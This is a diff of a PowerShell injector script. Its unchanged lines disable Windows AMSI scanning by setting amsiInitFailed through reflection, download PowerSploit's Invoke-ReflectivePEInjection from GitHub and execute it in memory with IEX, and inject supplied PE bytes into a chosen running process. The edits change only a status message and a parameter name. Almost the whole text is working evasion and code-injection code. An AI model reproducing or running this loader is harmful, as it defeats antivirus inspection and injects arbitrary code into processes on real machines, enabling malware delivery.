@@ -2,7 +2,7 @@ Write-Host "[*] Bypassing AMSI..." -ForegroundColor Yellow
 $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
 $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
 
-Write-Host "[*] Fetching Injector from GitHub..." -ForegroundColor Yellow
+Write-Host "[*] Fetching Injector from 077x1..." -ForegroundColor Yellow
 $injUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (New-Object Net.WebClient).DownloadString($injUrl)
@@ -27,6 +27,6 @@ if (-not $targetProc) {
 }
 
 Write-Host "[*] Injecting into PID: $($targetProc.Id) ..." -ForegroundColor Cyan
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessId $targetProc.Id
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcId $targetProc.Id
 
 Write-Host "[+] Done! UI should appear now." -ForegroundColor Green
